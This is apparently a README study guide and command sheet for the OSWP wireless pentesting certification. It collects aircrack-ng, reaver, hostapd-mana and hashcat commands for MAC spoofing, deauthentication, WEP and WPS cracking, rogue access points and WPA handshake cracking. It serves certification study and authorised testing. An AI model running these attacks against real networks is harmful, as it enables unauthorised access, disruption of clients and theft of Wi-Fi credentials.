# OSWP-Study-Guide
Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)

## Open Network with MAC filtering
In the event that fake authentication persistently fails, it is plausible that MAC address filtering is being employed. Under such a scheme, the Access Point (AP) will only permit connections from a predefined list of MAC addresses. Should this be the scenario, it will be necessary to acquire a legitimate MAC address by monitoring network traffic with the aid of Airodump-ng. Subsequently, impersonation of this MAC address should be carried out once the corresponding client has disconnected from the network. It is imperative to refrain from initiating a fake authentication attack targeting a specific MAC address if the client remains active on the AP.

### Packet capture
```bash
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
```
### Get your MAC address
```bash
macchanger --show <INTERFACE>
```

### Fake authentication attack
```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```

### ARP replay attack
```bash
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
```

### Deauthentication attack
```bash
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
```

### Crack 
```bash
aircrack-ng <CAPTURE_NAME>
```

## WEP (Wired Equivalent Privacy)
WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:


### Step 1: Kill conflicting processes
```bash
sudo airmon-ng check kill
```
### Step 2: Start monitor mode on wlan0
```bash
sudo airmon-ng start wlan0
```
### Step 3: Scan for WEP networks
```bash
sudo airodump-ng wlan0mon --encrypt WEP
```
### Step 4: Capture IVs
```bash
besside-ng -c Channel -b BSSID wlan0mon
```
### Step 5: Crack WEP key
```bash
aircrack-ng ./wep.cap
```

### Additional WEP Attacks:
[Hirte Attack](https://pentestlab.blog/2015/02/03/hirte-attack/)
[Caffe Latte Attck](https://www.computerworld.com/article/2539400/cafe-latte-attack-steals-data-from-wi-fi-users.html)

## WPS (Wi-Fi Protected Setup)
WPS was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:

### Identifying access points with WPS enabled
```bash
wash -i <INTERFACE> -s
```
### Fake authentication attack
```bash
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```
### Offline brute force (pixie dust)
```bash
reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
```
### Online brute force 
```bash
reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
```

## WPA/WPA2/WPA3 Testing
Steps for testing security on networks with WPA/WPA2/WPA3 encryption, including setting up rogue APs and capturing handshakes:

## Rogue Access Points
Instructions for creating a rogue AP.

### Discovery
```bash
sudo airodump-ng -w capturename –output-format pcap wlan0mon
```
**Wireshark Filters:**
```bash
wlan.fc.type_subtype == 0x08 #Broadcast Frames
wlan.ssid == “apname” #AP name
```
Filters can be appended to filter for broadcast frames from a specific AP:
```bash
wlan.fc.type_subtype == 0x08 && wlan.ssid == “apname”
```
The interesting parts are in Tag: Vendor Specific: & Tag: RSN: Information

### Creating a Rogue AP
Hostapd-mana template location:
```bash
/etc/hostapd-mana/hostapd-mana.conf
```
Or you may download the hostapd-mana.config in this repository and modify to your needs.

Start hostapd-mana:
```bash
sudo hostapd-mana hostapd-mana.conf
```

### Cracking .hccapx Files
**aircrack:**
```bash
aircrack-ng name.hccapx -w /wordlist/rockyou.txt
```
If you run into errors, you may try:
```bash
aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
```
**hashcat:**
```
hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt
```

## Information Discovery Example:
Information discovery example:
```bash
- ESSID of JesusIsTheWay
- BSSID of 34:5a:90:e0:5a:30
- WPS  (AES/CCM)
- Uses a PSK
- Runs on channel 1
```

## Definitions
- AP: Access Point
- BSSID: Basic Service Set Identifier is a 48-bit number that follows MAC address conventions.
- ESSID: Extended Service Set Identifier is a unique identifier to avoid interference on a wireless network.

## Troubleshooting
- Make sure that hostapd-mana is installed on Kali. Default installations currently feature hostapd, hostapd-wpa and hostapd_cli. None of these frameworks feature the *mana_wpaout* section in the *hostapd-mana.config*, and will result in error: *unknown configuration item 'mana_wpaout'*
- When starting the exam, fist thing after connecting to the .ovpn is to test both **SSH** and **RDP** protocols to ensure connection works as intended.
- In order to list wireless interfaces, execute command:
```bash
sudo airmon-ng
```
- To restart Network Manager, execute command:
```bash
systemctl restart NetworkManager.service
```  

## Sources
[LIODEUS OSWP Cheatsheet](https://liodeus.github.io/2020/10/29/OSWP-personal-cheatsheet.html)
[Hashcat File Formats](https://hashcat.net/wiki/doku.php?id=example_hashes)
[Hashcat Cracking WPA/WPA2](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
